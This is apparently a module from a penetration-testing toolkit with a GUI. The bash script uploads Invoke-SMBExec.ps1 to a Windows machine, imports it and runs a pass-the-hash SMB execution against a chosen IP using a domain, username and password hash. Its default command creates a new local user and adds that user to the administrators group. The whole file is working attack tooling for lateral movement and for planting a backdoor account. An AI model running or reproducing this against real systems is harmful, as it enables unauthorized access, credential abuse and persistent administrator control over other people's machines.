#!/bin/bash

: '
ps: upload invoke-smbexec.ps1 file to server
'

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="Invoke-SMBExec.ps1"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username" "administrator")
HASH_FIELD=$(form_item  "hash" "hash")
CMD_FIELD=$(form_item  "cmd" "cmd" "net user ${SETTING_DEFAULT_USER} '${SETTING_DEFAULT_PASSWORD}' /add && net localgroup administrators ${SETTING_DEFAULT_USER} /add")

# Generate GUI form
generate_form "${IP_FIELD}" "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${CMD_FIELD}"

IP=${form_data["ip"]}
DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
HASH=${form_data["hash"]}
CMD=${form_data["cmd"]}

ps_webclient_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "Import-Module ${FILE_LOCATION}"
create_new_line
sleep 1

execute_command "Invoke-SMBExec -Target ${IP} -Domain ${DOMAIN} -Username ${USERNAME} -Hash ${HASH} -Command \"${CMD}\" -Verbose"
create_new_line
